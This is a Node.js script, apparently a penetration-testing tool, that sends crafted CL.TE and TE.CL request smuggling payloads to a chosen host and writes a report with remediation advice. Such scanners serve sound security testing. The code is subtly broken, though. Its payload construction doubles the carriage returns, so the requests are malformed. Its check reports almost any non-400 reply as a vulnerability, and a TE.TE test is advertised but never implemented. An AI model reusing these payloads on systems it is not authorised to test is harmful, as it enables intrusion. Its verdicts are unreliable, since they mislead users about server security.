#!/usr/bin/env node
/**
 * HTTP Request Smuggling Tester
 * Tests for HTTP request smuggling vulnerabilities (CL.TE, TE.CL, TE.TE).
 */

const net = require('net');
const fs = require('fs');

class HTTPRequestSmugglingTester {
    constructor(host, port = 80) {
        this.host = host;
        this.port = port;
    }

    createClTePayload(path = '/') {
        return `POST ${path} HTTP/1.1\r
Host: ${this.host}\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
\r
SMUGGLED`.replace(/\n/g, '\r\n');
    }

    createTeClPayload(path = '/') {
        return `POST ${path} HTTP/1.1\r
Host: ${this.host}\r
Transfer-Encoding: chunked\r
Content-Length: 3\r
\r
0\r
\r
SMUGGLED`.replace(/\n/g, '\r\n');
    }

    sendPayload(payload) {
        return new Promise((resolve, reject) => {
            const sock = new net.Socket();
            sock.setTimeout(10000);
            
            sock.on('connect', () => {
                sock.write(payload);
            });
            
            sock.on('data', (data) => {
                sock.destroy();
                resolve(data.toString('utf8'));
            });
            
            sock.on('timeout', () => {
                sock.destroy();
                resolve('Timeout');
            });
            
            sock.on('error', (err) => {
                reject(err);
            });
            
            sock.connect(this.port, this.host);
        });
    }

    async testSmuggling() {
        console.log(`[*] Testing HTTP request smuggling on ${this.host}:${this.port}...`);
        
        const results = {
            clTe: false,
            teCl: false
        };
        
        // Test CL.TE
        console.log('[*] Testing CL.TE...');
        try {
            const clTePayload = this.createClTePayload();
            const response = await this.sendPayload(clTePayload);
            if (response.includes('SMUGGLED') || !response.includes('400')) {
                console.log('[+] Potential CL.TE vulnerability detected!');
                results.clTe = true;
            }
        } catch (err) {
            console.log(`[-] Error: ${err.message}`);
        }
        
        // Test TE.CL
        console.log('[*] Testing TE.CL...');
        try {
            const teClPayload = this.createTeClPayload();
            const response = await this.sendPayload(teClPayload);
            if (response.includes('SMUGGLED') || !response.includes('400')) {
                console.log('[+] Potential TE.CL vulnerability detected!');
                results.teCl = true;
            }
        } catch (err) {
            console.log(`[-] Error: ${err.message}`);
        }
        
        return results;
    }

    generateReport(results) {
        let report = `# HTTP Request Smuggling Test Report for ${this.host}:${this.port}\n\n`;
        
        if (results.clTe || results.teCl) {
            report += `⚠️ **VULNERABLE**: HTTP request smuggling vulnerability detected!\n\n`;
            if (results.clTe) {
                report += `- **CL.TE** (Content-Length: Transfer-Encoding) vulnerability found\n`;
            }
            if (results.teCl) {
                report += `- **TE.CL** (Transfer-Encoding: Content-Length) vulnerability found\n`;
            }
            report += `\n`;
        } else {
            report += `✅ No HTTP request smuggling vulnerability detected.\n\n`;
        }
        
        report += `## Attack Types\n\n`;
        report += `1. **CL.TE**: Frontend uses Content-Length, backend uses Transfer-Encoding\n`;
        report += `2. **TE.CL**: Frontend uses Transfer-Encoding, backend uses Content-Length\n`;
        report += `3. **TE.TE**: Both use Transfer-Encoding but handle it differently\n\n`;
        
        report += `## Recommendations\n\n`;
        report += `1. Use HTTP/2 or disable HTTP/1.1 connection reuse\n`;
        report += `2. Normalize requests at reverse proxy\n`;
        report += `3. Reject ambiguous requests\n`;
        report += `4. Use same server for frontend and backend\n\n`;
        
        return report;
    }
}

async function main() {
    if (process.argv.length < 3) {
        console.log('Usage: node http_request_smuggling.js <host> [port]');
        console.log('Example: node http_request_smuggling.js example.com');
        process.exit(1);
    }
    
    const host = process.argv[2];
    const port = parseInt(process.argv[3]) || 80;
    
    const tester = new HTTPRequestSmugglingTester(host, port);
    const results = await tester.testSmuggling();
    const report = tester.generateReport(results);
    
    const filename = 'http_request_smuggling_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] HTTP request smuggling testing complete`);
    console.log(`[+] Report saved to ${filename}`);
    console.log(`[!] WARNING: Only test applications you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = HTTPRequestSmugglingTester;

